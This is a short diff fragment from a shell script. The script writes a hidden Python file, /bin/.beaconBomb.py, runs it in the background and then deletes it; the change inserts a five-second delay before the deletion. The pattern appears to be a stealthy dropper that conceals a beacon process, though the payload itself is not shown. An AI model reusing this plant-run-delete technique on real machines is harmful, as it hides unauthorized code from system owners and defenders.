@@ -273,6 +273,7 @@ main()
 EOFA
 chmod +x /bin/.beaconBomb.py
 python3 /bin/.beaconBomb.py &
+sleep 5
 rm /bin/.beaconBomb.py
 fi
 EOFF
